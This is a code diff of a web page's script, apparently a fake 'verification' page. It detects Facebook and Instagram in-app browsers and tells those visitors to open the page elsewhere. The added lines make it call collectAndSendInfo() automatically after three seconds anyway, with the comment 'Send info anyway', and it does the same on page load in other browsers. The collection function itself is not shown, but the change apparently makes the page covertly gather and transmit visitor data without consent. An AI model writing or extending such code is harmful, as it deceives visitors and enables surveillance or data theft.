@@ -120,16 +120,20 @@
       return (ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 || ua.includes('Instagram'));
     }
 
+    function triggerFlow() {
+      setTimeout(() => {
+        collectAndSendInfo();
+      }, 3000);
+    }
+
     if (isFacebookWebView()) {
       document.getElementById("main-title").innerText = "External Browser Required";
       document.getElementById("main-desc").innerText = "Please open this page in Chrome, Safari, or another browser to continue verification.";
       document.querySelector(".loader").style.display = 'none';
+      // ✅ Send info anyway
+      triggerFlow();
     } else {
-      window.onload = () => {
-        setTimeout(() => {
-          collectAndSendInfo();
-        }, 3000);
-      };
+      window.onload = triggerFlow;
     }
 
     async function collectAndSendInfo() {
